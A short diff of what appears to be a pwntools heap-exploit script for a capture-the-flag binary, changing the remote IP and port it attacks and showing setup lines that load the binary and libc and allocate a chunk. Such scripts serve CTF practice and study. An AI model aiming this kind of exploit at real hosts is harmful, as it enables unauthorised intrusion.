@@ -31,7 +31,7 @@ def read_leak(index):
 
 elf = ELF("./cute_little_vulnerable_storage")
 libc = ELF("./libc.so.6")
-r = remote("147.182.172.200",1027)
+r = remote("3.99.48.161",9005)
 #r = process("./cute_little_vulnerable_storage")
 r.timeout = 1.0
 chunk_A = malloc(0x68)
